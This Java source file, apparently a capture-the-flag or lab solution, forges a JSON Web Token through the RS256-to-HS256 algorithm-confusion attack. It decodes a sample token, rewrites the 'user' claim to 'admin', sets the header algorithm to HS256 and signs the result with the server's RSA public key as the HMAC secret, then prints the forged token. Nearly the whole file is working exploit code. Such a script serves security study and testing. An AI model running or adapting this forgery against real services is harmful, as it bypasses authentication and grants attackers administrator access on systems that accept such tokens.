package JWT;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.Gson;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Map;

public class Main {
    private static String readKey(String keyPath) throws Exception {
        // 读取密钥文件内容
        StringBuilder keyBuilder = new StringBuilder();
        try(InputStream is=Main.class.getClassLoader().getResourceAsStream(keyPath);
            BufferedReader br=new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))){

            String line;
            while ((line = br.readLine()) != null) {
                keyBuilder.append(line).append("\n");
            }
        }
        return keyBuilder.toString();
    }
    public static void main(String[] args) throws Exception {
        try {
            // 获取示例JWT和密钥
            String jwt_sess= "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImlhdCI6MTc0ODk1NTMwNX0.GNqSODkUL_x7v09k41W5QxfKb3j4niILD2rQK-c8foukKFDEzPlT21PaeAh9N6G6rzD16jUDDNRSdbhSo8gh8LPpOVsnwQ3CMfVnmwB6jwrirv96pu5GXSUYk6nMP-Fr_-DznO2swJucxyAOMBgimXsQuzDa1RFlWQyGWz0iyYI";
            String privateKey = readKey("private.key");
            String publicKey = readKey("public.key");

            String[] decoded = jwt_decoder.decode(jwt_sess);
            System.out.println("Decoded Header: " + decoded[0]);
            System.out.println("Decoded Payload: " + decoded[1]);
//            System.out.println("Is JWT valid? " + jwt_decoder.verify(jwt_sess, publicKey));
            
            // 创建修改后的payload（user改为admin）
            Map<String, Object> payloadMap = new Gson().fromJson(decoded[1], Map.class);
            payloadMap.put("user", "admin");
            Number iat = (Number) payloadMap.get("iat");
            payloadMap.put("iat", iat.intValue());
            String modifiedPayload = new Gson().toJson(payloadMap);
            System.out.println("Modified Payload: " + modifiedPayload);
            
            // 创建修改后的header（alg改为HS256）
            JsonObject headerObj = JsonParser.parseString(decoded[0]).getAsJsonObject();
            headerObj.addProperty("alg", "HS256");
            String modifiedHeader = headerObj.toString();
            System.out.println("Modified Header: " + modifiedHeader);

            // 进行Base64URL编码
            String headerB64 = Base64.getUrlEncoder().withoutPadding().encodeToString(
                modifiedHeader.getBytes(StandardCharsets.UTF_8));
            String payloadB64 = Base64.getUrlEncoder().withoutPadding().encodeToString(
                modifiedPayload.getBytes(StandardCharsets.UTF_8));
            
            // 使用公钥作为密钥进行HS256签名
            String dataToSign = headerB64 + "." + payloadB64;
            String signature = jwt_encoder.signHS256WithPublicKey(dataToSign, publicKey);

            // 构造最终的JWT
            String forgedJWT = dataToSign + "." + signature;
            System.out.println(forgedJWT);
            

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
